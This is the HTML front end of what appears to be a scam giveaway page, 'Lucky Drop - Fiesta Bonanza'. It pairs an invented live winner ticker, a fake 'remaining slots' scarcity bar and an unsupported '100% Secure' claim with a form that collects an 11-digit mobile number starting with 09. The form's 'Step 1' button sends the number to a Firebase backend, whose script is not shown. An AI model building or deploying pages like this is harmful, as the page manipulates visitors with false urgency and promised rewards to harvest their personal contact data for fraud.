<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lucky Drop - Fiesta Celebration</title>
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Forum&family=Orbitron:wght@600;800;900&family=Playfair+Display:wght@700&family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Custom CSS -->
    <link rel="stylesheet" href="index.css">
</head>
<body>

    <!-- Particle Background Canvas -->
    <canvas id="particleCanvas" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1;"></canvas>

    <!-- Background Overlay for Readability -->
    <div class="bg-sky"></div>

    <!-- Live Ticker / Header Badge -->
    <div class="live-ticker">
        <div class="ticker-dot"></div>
        <div class="ticker-text" id="winnerEntry">Initializing...</div>
        <div class="ticker-badge">LIVE</div>
    </div>

    <!-- Main Card Container -->
    <main class="main-card" id="mainCard">
        
        <!-- Logo Area -->
        <div class="logo-area">
            <div class="logo-icon">
                <i class="fa-solid fa-gift"></i>
            </div>
            <h1 class="logo-text">FIESTA</h1>
            <div class="logo-text-sub">BONANZA</div>
            <p class="logo-sub">CELEBRATION BOOTH</p>
        </div>

        <!-- Value Props -->
        <div class="value-props">
            <div class="prop-row">
                <div class="prop-icon">
                    <i class="fa-solid fa-wand-magic-sparkles"></i>
                </div>
                <div>
                    <div class="prop-title">Exclusive Rewards</div>
                    <div class="prop-desc">Claim your festival gifts instantly</div>
                </div>
            </div>
            <div class="prop-row">
                <div class="prop-icon">
                    <i class="fa-solid fa-shield-halved"></i>
                </div>
                <div>
                    <div class="prop-title">Verified Access</div>
                    <div class="prop-desc">100% Secure & Fast verification</div>
                </div>
            </div>
        </div>

        <!-- Scarcity Tracker -->
        <div class="scarcity-box">
            <div class="scarcity-header">
                <span class="scarcity-label">REMAINING SLOTS</span>
                <div class="scarcity-numbers">
                    <span id="remNum">88</span><span class="scarcity-total">/100</span>
                </div>
            </div>
            <div class="progress-track">
                <div class="progress-fill" id="pBar" style="width: 88%;"></div>
            </div>
        </div>

        <!-- Swipe to Verify Container -->
        <div class="swipe-container">
            <div class="swipe-track" id="swipeTrack">
                <div class="swipe-fire-trail" id="swipeFireTrail"></div>
                <div class="swipe-text">SWIPE TO CLAIM</div>
                <div class="swipe-icon" id="swipeIcon">
                    <i class="fa-solid fa-angles-right" style="color: #fff; font-size: 18px;"></i>
                </div>
            </div>
        </div>

    </main>

    <!-- Modal Overlay -->
    <div class="modal-overlay" id="modalOverlay" style="display: none;">
        <div class="modal-card">
            <div id="modalBodyContent">
                <div class="logo-area" style="margin-bottom: 15px;">
                    <div class="logo-icon">
                        <i class="fa-solid fa-trophy"></i>
                    </div>
                    <h2 class="logo-text" style="font-size: 20px;">CLAIM REWARD</h2>
                    <p class="prop-desc" style="margin-top: 5px;">Enter your 11-digit mobile number starting with 09</p>
                </div>

                <div style="margin-bottom: 15px;">
                    <input type="tel" id="userPhone" placeholder="09123456789" maxlength="11" style="width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(244, 196, 48, 0.4); background: rgba(0, 0, 0, 0.5); color: #fff; font-size: 16px; text-align: center; font-family: 'Poppins', sans-serif; outline: none;">
                </div>

                <button class="login-btn" id="claimBtn" onclick="window.processStep1()">
                    <span class="login-text">SUBMIT</span>
                </button>
            </div>
        </div>
    </div>

    <!-- Firebase App & Database SDKs -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <!-- Firebase Configuration -->
    <script src="firebase-config.js"></script>

    <!-- Main Logic Script -->
    <script src="index.js"></script>
</body>
</html>
